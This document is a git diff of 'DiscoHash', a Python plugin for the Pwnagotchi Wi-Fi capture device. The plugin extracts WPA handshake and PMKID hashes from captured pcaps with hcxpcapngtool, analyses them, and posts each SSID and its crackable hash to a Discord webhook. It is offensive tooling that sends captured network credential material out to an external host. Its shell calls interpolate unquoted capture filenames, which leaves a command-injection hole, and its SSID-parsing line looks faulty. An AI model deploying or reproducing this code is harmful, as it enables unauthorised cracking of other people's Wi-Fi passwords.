@@ -7,11 +7,14 @@ import pwnagotchi
 import pwnagotchi.plugins as plugins
 
 
-class DiscoHash(plugins.Plugin):
-    __author__ = 'shain.lakin@protonmail.com aka v0yager'
+class discohash(plugins.Plugin):
+    __author__ = 'shain.lakin@protonmail.com'
     __version__ = '1.0.0'
     __license__ = 'GPL3'
-    __description__ = 'Posts hashes to discord.'
+    __description__ = '''
+                    DiscoHash extracts hashes from pcaps (hashcat mode 22000) using hcxpcapngtool,
+                    analyses the hash using hcxhashtool and posts the output to Discord.
+                    '''
 
     def __init__(self):
         logging.debug("[*] DiscoHash plugin created")
@@ -54,8 +57,9 @@ class DiscoHash(plugins.Plugin):
     def write_hash(self, fullpath):
         fullpathNoExt = fullpath.split('.')[0]
         filename = fullpath.split('/')[-1:][0].split('.')[0]
+        ssid = filename.split(('_')[-1:])
         result = subprocess.getoutput('hcxpcapngtool -o {}.22000 {} >/dev/null 2>&1'.format(fullpathNoExt,fullpath))
-        analysis = subprocess.getoutput('hcxhashtool -i {}.22000 --info=stdout')
+        analysis = subprocess.getoutput('hcxhashtool -i {}.22000 --info=stdout'.format(fullpathNoExt))
         if os.path.isfile(fullpathNoExt +  '.22000'):
             logging.info('[* DiscoHash *] [+] EAPOL/PMKID Success: {}.22000 created'.format(filename))
             
@@ -70,24 +74,24 @@ class DiscoHash(plugins.Plugin):
                 data = {
                     'embeds': [
                         {
-                        'title': 'WireTap hash update!',
+                        'title': '(⌐■_■) {} sniffed a new hash!'.format(pwnagotchi.name()), 
                         'color': 3553599,
-                        'description': 'New hash available:',
+                        'description': 'SSID and hash:',
                         'url': 'https://pwnagotchi.ai/pwnfile/#!{}'.format(fingerprint),
                         'fields': [
                             {
-                                'name': '{}'.format(filename),
+                                'name': '{}'.format(str(ssid[0])),
                                 'value': '`{}`'.format(hash_data),
-                                'inline': True
+                                'inline': False
                             },
                             {
                                 'name': 'Hash Analysis:',
-                                'value': '`{}`'.format(analysis),
-                                'inline': True
-                            }
+                                'value': '```{}```'.format(analysis),
+                                'inline': False
+                            },
                         ],
                         'footer': {
-                            'text': 'Pwnagotchi v1.5.5 - DiscoHash Plugin v{}'.format(self.__version__)
+                            'text': 'Pwnagotchi v1.5.5 - DiscoHash Plugin v{} created by {}'.format(self.__version__, self.__author__)
                         }
                         }
                     ]
@@ -95,7 +99,7 @@ class DiscoHash(plugins.Plugin):
                 requests.post(self.options['webhook_url'], files={'payload_json': (None, json.dumps(data))})
                 logging.info('[* DiscoHash *]: Webhook sent!')
             except Exception as e:
-                logging.info('[! DiscoHash !]: An error occured with the plugin!')
+                logging.info('[! DiscoHash !]: An error occured with the plugin!{}'.format(e))
             return True
         else:
             return False
